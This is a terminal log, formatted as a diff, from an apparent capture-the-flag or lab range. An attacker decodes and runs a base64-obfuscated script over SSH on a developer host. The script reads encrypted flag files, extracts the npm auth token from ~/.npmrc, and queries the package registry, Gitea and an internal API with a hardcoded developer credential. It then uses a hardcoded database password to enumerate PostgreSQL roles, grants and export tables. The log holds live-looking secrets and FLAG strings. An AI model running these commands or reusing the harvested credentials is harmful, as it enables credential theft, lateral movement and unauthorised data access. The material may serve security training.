@@ -1,0 +1,210 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/f2.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCJSRU1PVEUiIDI+JjEgfCB0YWlsIC01MDAKc2V0ICtlCkNBPSRIT01FLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9IkF1dGhvcml6YXRpb246IEJhc2ljICQocHJpbnRmICJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIiB8IGJhc2U2NCAtdzApIgpEPSJodHRwczovL2RlbGl2ZXJ5LmtlcGxlcm9wcy50ZXN0Ojg0NDMiCmVjaG8gIj09PT09IEVOQyBGSUxFUyA9PT09PSIKZm9yIGYgaW4gfi93b3JrL3JlZ2lzdHJ5LyouZW5jOyBkbyBlY2hvICItLS0tLSAkZiI7IGxzIC1sICIkZiI7IGVjaG8gIltjYXRdIjsgY2F0ICIkZiI7IGVjaG87IGVjaG8gIltvZF0iOyBvZCAtQW4gLXR4MSAiJGYiIHwgaGVhZCAtODsgZWNobzsgZG9uZQplY2hvICI9PT09PSBQQUNLQUdFIE1FVEEgKGF1dGgpID09PT09IgpjdXJsIC1zUyAtbSAyMCAtSCAiJEEiICIkRC9hcGkvcGFja2FnZS1tZXRhL2ZpZWxkbGluay1jb25uZWN0b3IiIC0tY2FjZXJ0ICRDQSAtdyAiIFsle2h0dHBfY29kZX1dIjsgZWNobwplY2hvICI9PT09PSBQUklWQVRFIE1FVEEgc3VwcG9ydC1yZWhlYXJzYWwgPT09PT0iCk5BVVRIPSQoc2VkIC1uICJzfC4qcGFja2FnZXMua2VwbGVyb3BzLnRlc3QvOl9hdXRoPXx8cCIgfi8ubnBtcmMpCmN1cmwgLXNTIC1tIDIwIC1IICJBdXRob3JpemF0aW9uOiBCYXNpYyAkTkFVVEgiICJodHRwczovL3BhY2thZ2VzLmtlcGxlcm9wcy50ZXN0L0BrZXBsZXJvcHMlMmZzdXBwb3J0LXJlaGVhcnNhbCIgLS1jYWNlcnQgJENBIC13ICIgWyV7aHR0cF9jb2RlfV0iOyBlY2hvCmVjaG8gIj09PT09IE5QTSBWRVJTSU9OIERFVEFJTCA9PT09PSIKZXhwb3J0IE5PREVfRVhUUkFfQ0FfQ0VSVFM9JENBCmZvciB2IGluIDYuOS44IDcuNC4wIDcuNC4xIDcuNC4yIDcuNC4zLWNpbmRlci5yc2V0MTsgZG8gZWNobyAiLS0tLS0gJHYiOyBucG0gdmlldyBAa2VwbGVyb3BzL2ZpZWxkbGluay1jb25uZWN0b3JAJHYgLS1qc29uIDI+L2Rldi9udWxsIHwgcHl0aG9uMyAtYyAiaW1wb3J0IGpzb24sc3lzOyBkPWpzb24ubG9hZChzeXMuc3RkaW4pOyBwcmludChqc29uLmR1bXBzKHtrOmQuZ2V0KGspIGZvciBrIGluIFtcIm5hbWVcIixcInZlcnNpb25cIixcImRpc3RcIixcIl9ucG1WZXJzaW9uXCIsXCJfbm9kZVZlcnNpb25cIixcImdpdEhlYWRcIixcImZpZWxka2VzdFwiLFwiZGVwcmVjYXRlZFwiXX0saW5kZW50PTEpKSIgMj4mMTsgZG9uZQplY2hvICI9PT09PSBHSVRFQSBSRVBPIFNFQVJDSCA9PT09PSIKZm9yIHEgaW4gZGVsaXZlcnkgcmVjb25jaWxlIGZpZWxka2VzdCBjbGllbnQgcG9saWN5OyBkbyBlY2hvICItLS0gcT0kcSI7IGN1cmwgLXNTIC1tIDIwIC1IICIkQSIgImh0dHBzOi8vc291cmNlLmtlcGxlcm9wcy50ZXN0L2FwaS92MS9yZXBvcy9zZWFyY2g/cT0kcSZsaW1pdD0yMCIgLS1jYWNlcnQgJENBIHwgcHl0aG9uMyAtYyAiaW1wb3J0IGpzb24sc3lzOyBkPWpzb24ubG9hZChzeXMuc3RkaW4pOyBbcHJpbnQocltcImZ1bGxfbmFtZVwiXSxcInxcIixyLmdldChcImRlc2NyaXB0aW9uXCIsXCJcIikpIGZvciByIGluIGQuZ2V0KFwiZGF0YVwiKSBvciBkLmdldChcInJlcG9zXCIpIG9yIFtdXSIgMj4mMTsgZG9uZQplY2hvICI9PT09PSBDT05TVU1FUiBDSEVDSyA9PT09PSIKY3VybCAtc1MgLW0gMzAgLWkgLVggUE9TVCAiJEQvYXBpL2NvbnN1bWVyLWNoZWNrcyIgLUggIiRBIiAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAtLWNhY2VydCAkQ0EgLS1kYXRhIEAkSE9NRS93b3JrL3JlZ2lzdHJ5L2NvbnN1bWVyLXJlcXVlc3QuanNvbgplY2hvCmVjaG8gIj09PT09IERCIEdSQU5UUy9ST0xFUyA9PT09PSIKZXhwb3J0IFBHUEFTU1dPUkQ9bG9iZjlKdDBTQlc0MzNpbjZ3VVZsa2l4blFyZWg1Sy1aMUxqYlRvZnJxWQpQPSJwc3FsIC1oIGRhdGEua2VwbGVyb3BzLnRlc3QgLVUgcm93YW5fZGF0YSAtZCBmaWVsZGxpbmtfZGF0YSAtQXQiCiRQIC1jICJzZWxlY3Qgcm9sbmFtZSBmcm9tIHBnX3JvbGVzIG9yZGVyIGJ5IDEiCiRQIC1jICJzZWxlY3QgdGFibGVfc2NoZW1hfHxjaHIoNDYpfHx0YWJsZV9uYW1lfHxjaHIoOSl8fHByaXZpbGVnZV90eXBlIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnJvbGVfdGFibGVfZ3JhbnRzIHdoZXJlIGdyYW50ZWUgPSBjdXJyZW50X3VzZXIgb3JkZXIgYnkgMSIgfCBoZWFkIC00MAokUCAtYyAic2VsZWN0ICogZnJvbSBleHBvcnQucGFydGl0aW9uX2JpbmRpbmdzIgpSRU1PVEUK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/f2.sh; bash /tmp/f2.sh; echo DONEMARK_1795200321453$((6*7))
+===== ENC FILES =====
+----- /home/rowan/work/registry/k05-1-check.enc
+-rw-r--r-- 1 rowan rowan 64 Nov 19 13:52 /home/rowan/work/registry/k05-1-check.enc
+[cat]
+U2FsdGVkX1/i9AN3HWS7W5odfGfm3gyimhecKQfCjlGu+IPORoF6Q0D0pHUgkicx
+[od]
+ 55 32 46 73 64 47 56 6b 58 31 2f 69 39 41 4e 33
+ 48 57 53 37 57 35 6f 64 66 47 66 6d 33 67 79 69
+ 6d 68 65 63 4b 51 66 43 6a 6c 47 75 2b 49 50 4f
+ 52 6f 46 36 51 30 44 30 70 48 55 67 6b 69 63 78
+
+----- /home/rowan/work/registry/k05-3-reconcile.enc
+-rw-r--r-- 1 rowan rowan 64 Nov 19 13:52 /home/rowan/work/registry/k05-3-reconcile.enc
+[cat]
+U2FsdGVkX1/hay6oFKkVXJwaWO/8gCBiQ+u45tfNaHvqpLeIL4DXziiMHQF7bVoS
+[od]
+ 55 32 46 73 64 47 56 6b 58 31 2f 68 61 79 36 6f
+ 46 4b 6b 56 58 4a 77 61 57 4f 2f 38 67 43 42 69
+ 51 2b 75 34 35 74 66 4e 61 48 76 71 70 4c 65 49
+ 4c 34 44 58 7a 69 69 4d 48 51 46 37 62 56 6f 53
+
+----- /home/rowan/work/registry/k05-4-check.enc
+-rw-r--r-- 1 rowan rowan 64 Nov 19 13:52 /home/rowan/work/registry/k05-4-check.enc
+[cat]
+U2FsdGVkX1/vF/J8QiIBiMj5DT0vuq4iw/wjme2uvn7Xyg7c1mE3E11hGR5PppxT
+[od]
+ 55 32 46 73 64 47 56 6b 58 31 2f 76 46 2f 4a 38
+ 51 69 49 42 69 4d 6a 35 44 54 30 76 75 71 34 69
+ 77 2f 77 6a 6d 65 32 75 76 6e 37 58 79 67 37 63
+ 31 6d 45 33 45 31 31 68 47 52 35 50 70 70 78 54
+
+----- /home/rowan/work/registry/k07-2-envelope.enc
+-rw-r--r-- 1 rowan rowan 64 Nov 19 13:52 /home/rowan/work/registry/k07-2-envelope.enc
+[cat]
+U2FsdGVkX19u6lR20tI2eV5x42T/fS1q6EGx2iYHBY+ZhyZuMEQFgYe2GcML0Vka
+[od]
+ 55 32 46 73 64 47 56 6b 58 31 39 75 36 6c 52 32
+ 30 74 49 32 65 56 35 78 34 32 54 2f 66 53 31 71
+ 36 45 47 78 32 69 59 48 42 59 2b 5a 68 79 5a 75
+ 4d 45 51 46 67 59 65 32 47 63 4d 4c 30 56 6b 61
+
+----- /home/rowan/work/registry/k08-2-entitlement.enc
+-rw-r--r-- 1 rowan rowan 64 Nov 19 13:52 /home/rowan/work/registry/k08-2-entitlement.enc
+[cat]
+U2FsdGVkX1+neXqQQbb5aUlxnt7dhOmJcpAwX86kOU4Ct5sOffaJ/QTz4WQ8gC2p
+[od]
+ 55 32 46 73 64 47 56 6b 58 31 2b 6e 65 58 71 51
+ 51 62 62 35 61 55 6c 78 6e 74 37 64 68 4f 6d 4a
+ 63 70 41 77 58 38 36 6b 4f 55 34 43 74 35 73 4f
+ 66 66 61 4a 2f 51 54 7a 34 57 51 38 67 43 32 70
+
+----- /home/rowan/work/registry/k08-3-entitlement.enc
+-rw-r--r-- 1 rowan rowan 64 Nov 19 13:52 /home/rowan/work/registry/k08-3-entitlement.enc
+[cat]
+U2FsdGVkX18WE+IjFL6EAVHyClhPwCYJkt5PiWTgqXcIGkIKzlAuo7aSUCu8RwBq
+[od]
+ 55 32 46 73 64 47 56 6b 58 31 38 57 45 2b 49 6a
+ 46 4c 36 45 41 56 48 79 43 6c 68 50 77 43 59 4a
+ 6b 74 35 50 69 57 54 67 71 58 63 49 47 6b 49 4b
+ 7a 6c 41 75 6f 37 61 53 55 43 75 38 52 77 42 71
+
+===== PACKAGE META (auth) =====
+{"_attachments":{},"_id":"@keplerops/fieldlink-connector","_rev":"22-f28b25f4f521b26f","channels":{"arwc-stable":{"rollback_candidates":["7.4.2"],"rollback_slot":"7.4.2"}},"compatible_interfaces":["fieldkest.connector/v2","fieldkest.connector/v3"],"dist-tags":{"latest":"7.4.2","legacy":"6.9.8","next":"7.4.3-cinder.rset1"},"interface":"fieldkest.connector/v3","name":"@keplerops/fieldlink-connector","pending_release":"7.4.3-cinder.rset1","readme":"# FieldLink connector 7.4.2\n\nThe connector summarizes callback observations for a named customer asset.\nIt exports `consume(request)` and accepts `fieldkest.connector/v3` requests.\nProvide `tenant_id`, `asset_id`, and an optional `measurements` object with\n`callback_latency_ms` and `sample_count`.\n\nThe result retains the tenant and asset, states the connector version, and\ncompares the observed latency and sample count with `limits.json`.\nMissing measurements are reported as unknown values rather than invented\nsamples. Invalid units or negative measurements are rejected.\n\n","time":{"6.9.8":"2026-11-19T07:07:37.113Z","7.4.0":"2026-11-19T07:07:38.278Z","7.4.1":"2026-11-19T07:07:39.390Z","7.4.2":"2026-11-19T13:49:20.259Z","7.4.3-cinder.rset1":"2026-11-19T07:07:35.928Z","created":"2026-11-19T07:07:35.928Z","modified":"2026-11-19T13:49:20.259Z"},"users":{},"versions":{"6.9.8":{"_id":"@keplerops/fieldlink-connector@6.9.8","_nodeVersion":"22.19.0","_npmVersion":"10.9.3","contributors":[],"deprecated":"The legacy v2 interface is retained for maintained installations. Maintenance record MTN-6.9.8. FLAG{870a03c573511895}","description":"FieldLink field-device diagnostic summary connector","dist":{"integrity":"sha512-+KvDkhs7BtY6cXemSNVtHJfCNTXuxEsvNYJahQ1jlIx3/xxh1fxc+5FoaiIcmKPF71qBuCv5R1Yy4CIJQhJu1w==","shasum":"ec39679f96ff60633f5b1fca2374e8076fd62f05","tarball":"https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-6.9.8.tgz"},"engines":{"node":">=22"},"fieldkest":{"interface":"fieldkest.connector/v2"},"files":["index.js","limits.json","README.md"],"license":"UNLICENSED","main":"index.js","name":"@keplerops/fieldlink-connector","readmeFilename":"README.md","version":"6.9.8"},"7.4.0":{"_id":"@keplerops/fieldlink-connector@7.4.0","_nodeVersion":"22.19.0","_npmVersion":"10.9.3","contributors":[],"description":"FieldLink field-device diagnostic summary connector","dist":{"integrity":"sha512-y8KZrQ/+LVvD662h4PnAx3BsE73A9akRLaBC1l/QeSjU3syI53iMxT9LMRKCUSZZ5Rsfvdjidgo0tZeKq5HQGA==","shasum":"1c72e25102cd5e9ef98b6ac282e9c41df31d7f66","tarball":"https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.0.tgz"},"engines":{"node":">=22"},"fieldkest":{"interface":"fieldkest.connector/v3"},"files":["index.js","limits.json","README.md"],"license":"UNLICENSED","main":"index.js","name":"@keplerops/fieldlink-connector","readmeFilename":"README.md","version":"7.4.0"},"7.4.1":{"_id":"@keplerops/fieldlink-connector@7.4.1","_nodeVersion":"22.19.0","_npmVersion":"10.9.3","contributors":[],"description":"FieldLink field-device diagnostic summary connector","dist":{"integrity":"sha512-GDfYW7Z8X2v1A887MsEy1soYJrY3S/0Qn87IGrVso2W6aLQrPbggkuZim4i8V77tA+mvcxprGufHsi6+PFgDXQ==","shasum":"7178f827a7575422f70be04c194004c71263401e","tarball":"https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.1.tgz"},"engines":{"node":">=22"},"fieldkest":{"interface":"fieldkest.connector/v3"},"files":["index.js","limits.json","README.md"],"license":"UNLICENSED","main":"index.js","name":"@keplerops/fieldlink-connector","readmeFilename":"README.md","version":"7.4.1"},"7.4.2":{"_id":"@keplerops/fieldlink-connector@7.4.2","_nodeVersion":"22.19.0","_npmVersion":"10.9.3","contributors":[],"description":"FieldLink field-device diagnostic summary connector","dist":{"integrity":"sha512-gx3TMZcbHoOgULidxWJoCsmW8sA9dzBLu4CAtpQY+jhsLLiSwMpexrhJ+CFgipmpfoenDLp3FqsJg4dlk8s5uw==","shasum":"65cce7ea8b13e6c7acde82e182a8613f88673f30","tarball":"https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.2.tgz"},"engines":{"node":">=22"},"fieldkest":{"interface":"fieldkest.connector/v3"},"files":["index.js","limits.json","README.md"],"license":"UNLICENSED","main":"index.js","name":"@keplerops/fieldlink-connector","readmeFilename":"README.md","version":"7.4.2"},"7.4.3-cinder.rset1":{"_id":"@keplerops/fieldlink-connector@7.4.3-cinder.rset1","_nodeVersion":"22.19.0","_npmVersion":"10.9.3","contributors":[],"description":"FieldLink field-device diagnostic summary connector","dist":{"integrity":"sha512-M0cxDXDBHk7vtOhrcivKM9Y9cCxmcc/DFMusVaHAA5TpmdyXy9FP1vABsxhhzYhkyAZVthK5S+0D4WbDGPLs4g==","shasum":"08b0bd67d45be262c874115bb5321b7e5291aa9e","tarball":"https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.3-cinder.rset1.tgz"},"engines":{"node":">=22"},"fieldkest":{"compatible_interfaces":["fieldkest.connector/v2","fieldkest.connector/v3"],"interface":"fieldkest.connector/v3"},"files":["index.js","limits.json","README.md"],"license":"UNLICENSED","main":"index.js","name":"@keplerops/fieldlink-connector","readmeFilename":"README.md","version":"7.4.3-cinder.rset1"}}}
+ [200]
+===== PRIVATE META support-rehearsal =====
+{
+  "error": "user rowan.ito is not allowed to access package @keplerops/support-rehearsal"
+}
+ [403]
+===== NPM VERSION DETAIL =====
+----- 6.9.8
+{
+ "name": "@keplerops/fieldlink-connector",
+ "version": "6.9.8",
+ "dist": {
+  "integrity": "sha512-+KvDkhs7BtY6cXemSNVtHJfCNTXuxEsvNYJahQ1jlIx3/xxh1fxc+5FoaiIcmKPF71qBuCv5R1Yy4CIJQhJu1w==",
+  "shasum": "ec39679f96ff60633f5b1fca2374e8076fd62f05",
+  "tarball": "https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-6.9.8.tgz"
+ },
+ "_npmVersion": "10.9.3",
+ "_nodeVersion": "22.19.0",
+ "gitHead": null,
+ "fieldkest": {
+  "interface": "fieldkest.connector/v2"
+ },
+ "deprecated": "The legacy v2 interface is retained for maintained installations. Maintenance record MTN-6.9.8. FLAG{870a03c573511895}"
+}
+----- 7.4.0
+{
+ "name": "@keplerops/fieldlink-connector",
+ "version": "7.4.0",
+ "dist": {
+  "integrity": "sha512-y8KZrQ/+LVvD662h4PnAx3BsE73A9akRLaBC1l/QeSjU3syI53iMxT9LMRKCUSZZ5Rsfvdjidgo0tZeKq5HQGA==",
+  "shasum": "1c72e25102cd5e9ef98b6ac282e9c41df31d7f66",
+  "tarball": "https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.0.tgz"
+ },
+ "_npmVersion": "10.9.3",
+ "_nodeVersion": "22.19.0",
+ "gitHead": null,
+ "fieldkest": {
+  "interface": "fieldkest.connector/v3"
+ },
+ "deprecated": null
+}
+----- 7.4.1
+{
+ "name": "@keplerops/fieldlink-connector",
+ "version": "7.4.1",
+ "dist": {
+  "integrity": "sha512-GDfYW7Z8X2v1A887MsEy1soYJrY3S/0Qn87IGrVso2W6aLQrPbggkuZim4i8V77tA+mvcxprGufHsi6+PFgDXQ==",
+  "shasum": "7178f827a7575422f70be04c194004c71263401e",
+  "tarball": "https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.1.tgz"
+ },
+ "_npmVersion": "10.9.3",
+ "_nodeVersion": "22.19.0",
+ "gitHead": null,
+ "fieldkest": {
+  "interface": "fieldkest.connector/v3"
+ },
+ "deprecated": null
+}
+----- 7.4.2
+{
+ "name": "@keplerops/fieldlink-connector",
+ "version": "7.4.2",
+ "dist": {
+  "integrity": "sha512-gx3TMZcbHoOgULidxWJoCsmW8sA9dzBLu4CAtpQY+jhsLLiSwMpexrhJ+CFgipmpfoenDLp3FqsJg4dlk8s5uw==",
+  "shasum": "65cce7ea8b13e6c7acde82e182a8613f88673f30",
+  "tarball": "https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.2.tgz"
+ },
+ "_npmVersion": "10.9.3",
+ "_nodeVersion": "22.19.0",
+ "gitHead": null,
+ "fieldkest": {
+  "interface": "fieldkest.connector/v3"
+ },
+ "deprecated": null
+}
+----- 7.4.3-cinder.rset1
+{
+ "name": "@keplerops/fieldlink-connector",
+ "version": "7.4.3-cinder.rset1",
+ "dist": {
+  "integrity": "sha512-M0cxDXDBHk7vtOhrcivKM9Y9cCxmcc/DFMusVaHAA5TpmdyXy9FP1vABsxhhzYhkyAZVthK5S+0D4WbDGPLs4g==",
+  "shasum": "08b0bd67d45be262c874115bb5321b7e5291aa9e",
+  "tarball": "https://packages.keplerops.test/@keplerops/fieldlink-connector/-/fieldlink-connector-7.4.3-cinder.rset1.tgz"
+ },
+ "_npmVersion": "10.9.3",
+ "_nodeVersion": "22.19.0",
+ "gitHead": null,
+ "fieldkest": {
+  "interface": "fieldkest.connector/v3",
+  "compatible_interfaces": [
+   "fieldkest.connector/v2",
+   "fieldkest.connector/v3"
+  ]
+ },
+ "deprecated": null
+}
+===== GITEA REPO SEARCH =====
+--- q=delivery
+--- q=reconcile
+--- q=fieldkest
+--- q=client
+--- q=policy
+fieldkest/policy-compiler | Retained policy compiler and migration examples
+===== CONSUMER CHECK =====
+HTTP/1.1 201 Created
+Server: nginx
+Date: Fri, 20 Nov 2026 18:45:37 GMT
+Content-Type: application/json
+Content-Length: 945
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 612af0c8-9b73-457a-903c-46bf9654ea0e
+
+{"check_id":"CHK-E04D3C186B60","check_reference":"dac4e2ef698fe4311b6186664add17f3a3710e2275c4c16bfae334e9a6fb3ef0","consumer_revision":"arwc-connector-consumer@19f43d2","declared_range":"^7.4.0","package":"@keplerops/fieldlink-connector","package_sha256":"4374eaa8d76237949cd373c889fb778b8c67b00c88b51f9a359ef1c3b3ddbb50","request":{"asset_id":"CRR-OG2","measurements":{"callback_latency_ms":184,"sample_count":17},"operation":"summarize_diagnostics","schema":"fieldkest.connector/v3","tenant_id":"TEN-ARWC-047"},"resolved_version":"7.4.2","result":{"assessment":"within-operating-limits","asset_id":"CRR-OG2","connector_version":"7.4.2","observations":{"callback_latency_ms":184,"sample_count":17},"schema":"fieldkest.rehearsal-result/v1","tenant_id":"TEN-ARWC-047"},"result_digest":"5787c050497447c2a4ec1387a0d48720957a25c2b8ab334b1a430cdbc06e714c","schema":"fieldkest.consumer-check-result/v1","sealed_flag":"work/registry/k05-1-check.enc"}
+
+===== DB GRANTS/ROLES =====
+fieldlink_admin
+fieldlink_data_owner
+fieldlink_identity
+fieldlink_staff
+pg_checkpoint
+pg_create_subscription
+pg_database_owner
+pg_execute_server_program
+pg_monitor
+pg_read_all_data
+pg_read_all_settings
+pg_read_all_stats
+pg_read_server_files
+pg_signal_backend
+pg_stat_scan_tables
+pg_use_reserved_connections
+pg_write_all_data
+pg_write_server_files
+rowan_data
+export.partition_bindings	SELECT
+EXP-2841|TEN-ARWC-019|PART-ARWC-01|FLK-7.4.2|6|t
+EXP-2841|TEN-OTHER-001|PART-ARWC-02|FLK-7.3.1|5|f
